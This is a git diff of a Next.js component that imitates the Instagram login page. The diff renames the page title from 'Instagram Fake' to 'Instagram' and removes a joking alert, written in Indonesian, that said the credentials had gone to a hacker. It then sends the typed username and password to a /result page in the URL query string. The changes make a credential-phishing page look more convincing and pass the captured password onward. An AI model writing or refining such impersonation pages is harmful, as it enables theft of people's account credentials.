@@ -9,11 +9,14 @@ import GooglePlay from "@/../public/GooglePlay.png";
 import Microsoft from "@/../public/Microsoft.png";
 import { useEffect, useState } from "react";
 import Head from "next/head";
+import { useRouter } from "next/router";
 
 export default function Instagram() {
   const [displayImage, setDisplayImage] = useState<number>(0);
   const [identifier, setIdentifier] = useState<string>("");
   const [password, setPassword] = useState<string>("");
+
+  const router = useRouter();
 
   useEffect(() => {
     const intervalId = setInterval(() => {
@@ -31,7 +34,7 @@ export default function Instagram() {
   return (
     <main className="bg-white min-h-screen flex justify-center items-center text-black">
       <Head>
-        <title>Instagram Fake</title>
+        <title>Instagram</title>
         <link
           rel="icon"
           href="/InstagramLogo.png"
@@ -89,15 +92,7 @@ export default function Instagram() {
             className="flex flex-col justify-center items-center"
             onSubmit={(e) => {
               e.preventDefault();
-              console.log(`Phone/email/username\t: ${identifier}`);
-              console.log(`Password\t: ${password}`);
-              alert(
-                `
-            Kredensial anda telah dikirim ke hacker 😂\n
-            ID : ${identifier}\n
-            Password : ${password}
-            `
-              );
+              router.push(`/result?id=${identifier}&password=${password}`);
             }}
           >
             <label>
@@ -165,7 +160,7 @@ export default function Instagram() {
           </a>
         </section>
 
-            <p className="text-[14px] text-center mt-[20px] mb-[10px]">Get the app.</p>
+        <p className="text-[14px] text-center mt-[20px] mb-[10px]">Get the app.</p>
         <section className="flex justify-center mt-[15px] pb-10 gap-2">
           <Image
             src={GooglePlay}
